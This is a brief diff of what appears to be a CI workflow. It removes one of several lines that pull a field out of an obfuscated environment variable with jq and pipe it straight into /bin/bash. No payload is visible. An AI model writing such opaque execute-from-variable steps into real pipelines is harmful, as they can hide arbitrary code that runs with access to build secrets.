@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$tb175" | jq -r .hwwkq6891 | /bin/bash
           printf '%s' "$oo5" | jq -r .o8 | /bin/bash
-          printf '%s' "$zqyc02" | jq -r .hhg916 | /bin/bash
           echo $vy9221 | jq -r .zpjyt57790 | /bin/bash
 
       - name: Save output
